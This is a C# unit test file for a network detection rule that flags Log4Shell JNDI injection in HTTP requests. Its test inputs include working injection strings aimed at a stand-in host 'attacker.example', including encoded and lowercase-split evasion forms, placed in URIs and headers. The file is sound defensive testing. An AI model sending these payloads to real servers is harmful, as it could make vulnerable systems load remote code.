// SPDX-License-Identifier: MIT
using System;
using System.Threading;
using System.Threading.Tasks;
using Carthago.Engine.Rules.Payloads;
using Xunit;
namespace Carthago.Tests;

public sealed class R084AdvancedAccuracyBatchTests
{
    private readonly R084_Log4ShellJNDIInjectionPatternRule _rule=new();
    private async Task<bool> Seen(int sec,string uri="/",string? headers=null,
        string? userAgent=null,string? info=null)
        =>(await _rule.EvaluateAsync(NetworkBatch081085Context.Http(sec,uri,headers,userAgent,info))).Matched;

    [Fact] public async Task Direct_Jndi_Ldap_Request_Is_Detected()
    {
        Assert.True(await Seen(1,uri:"/?q=${jndi:ldap://attacker.example/a}"));
    }
    [Fact] public async Task Double_PercentEncoded_Jndi_Still_Matches()
    {
        Assert.True(await Seen(1,uri:"/?q=%2524%257Bjndi%253Aldap%253A%252F%252Fattacker.example%252Fa%257D"));
    }
    [Fact] public async Task Lowercase_Interpolation_And_Header_Attack_Are_Detected()
    {
        Assert.True(await Seen(1,uri:"/?q=${${lower:j}ndi:ldap://attacker.example/a}"));
        Assert.True(await Seen(2,headers:"Host: app.example.test\r\nUser-Agent: ${jndi:rmi://attacker.example/a}\r\n\r\n"));
    }
    [Fact] public async Task Fully_Split_Lowercase_Jndi_Lookup_Is_Recognized_Without_Raw_Evidence()
    {
        var lookup = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.example/a}";
        var result = await _rule.EvaluateAsync(
            NetworkBatch081085Context.Http(5, uri:"/search?q="+lookup));
        var detection = Assert.Single(result.Events);
        Assert.Equal("R084", detection.RuleId);
        Assert.DoesNotContain("attacker.example", detection.Evidence);
        Assert.DoesNotContain("lower:j", detection.Description);
    }

    [Fact] public async Task Benign_Documentation_And_Info_Only_Keyword_Are_Not_Exploits()
    {
        Assert.False(await Seen(1,uri:"/help?topic=jndi+ldap+configuration"));
        Assert.False(await Seen(2,info:"${jndi:ldap://attacker.example/a}"));
        Assert.False(await Seen(3,uri:"/help?q=${jndi:ftp://example/a}"));
    }
    [Fact] public async Task Wrong_Transport_Response_And_Contradictory_Host_Fail_Closed()
    {
        var r=NetworkBatch081085Context.Http(1,uri:"/?q=${jndi:ldap://attacker.example/a}");
        r.Record.IsUdp=true;Assert.False((await _rule.EvaluateAsync(r)).Matched);
        r=NetworkBatch081085Context.Http(2,uri:"/?q=${jndi:ldap://attacker.example/a}");
        r.Record.HttpMethod=null;Assert.False((await _rule.EvaluateAsync(r)).Matched);
        r=NetworkBatch081085Context.Http(3,uri:"/?q=${jndi:ldap://attacker.example/a}",
            headers:"Host: unrelated.example.test\r\n\r\n");
        Assert.False((await _rule.EvaluateAsync(r)).Matched);
        r=NetworkBatch081085Context.Http(4,uri:"/?q=${jndi:ldap://attacker.example/a}",
            headers:"Host: app.example.test\r\n");
        Assert.False((await _rule.EvaluateAsync(r)).Matched);
    }
    [Fact] public async Task Repeated_Record_Id_Is_Deduplicated_But_New_Observation_Alerts()
    {
        var id=Guid.NewGuid();
        var r=NetworkBatch081085Context.Http(1,uri:"/?q=${jndi:ldap://attacker.example/a}",id:id);
        Assert.True((await _rule.EvaluateAsync(r)).Matched);
        Assert.False((await _rule.EvaluateAsync(r)).Matched);
        Assert.True(await Seen(2,uri:"/?q=${jndi:ldap://attacker.example/a}"));
    }
    [Fact] public async Task Cancellation_And_Privacy_Do_Not_Expose_Payload_Or_Tokens()
    {
        using var cts=new CancellationTokenSource();cts.Cancel();
        await Assert.ThrowsAnyAsync<OperationCanceledException>(async()=>
            await _rule.EvaluateAsync(NetworkBatch081085Context.Http(1),cts.Token));
        var r=NetworkBatch081085Context.Http(2,
            uri:"/?token=secret-84&x=${jndi:ldap://attacker.example/a}",
            userAgent:"token=secret-84");
        var e=Assert.Single((await _rule.EvaluateAsync(r)).Events);
        Assert.DoesNotContain("secret-84",e.Description);
        Assert.DoesNotContain("secret-84",e.Evidence);
        Assert.DoesNotContain("attacker.example",e.Summary);
    }
}
